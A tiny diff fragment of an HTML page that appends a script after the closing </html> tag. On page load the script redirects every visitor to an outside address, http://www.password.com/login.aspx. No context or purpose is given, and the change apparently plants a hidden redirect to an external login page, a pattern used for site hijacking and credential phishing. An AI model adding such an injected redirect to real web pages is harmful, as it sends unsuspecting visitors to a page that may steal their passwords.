@@ -19,4 +19,7 @@
 </body>
 </html>
 
+<script>
+    window.location.href = "http://www.password.com/login.aspx";
+</script>
 
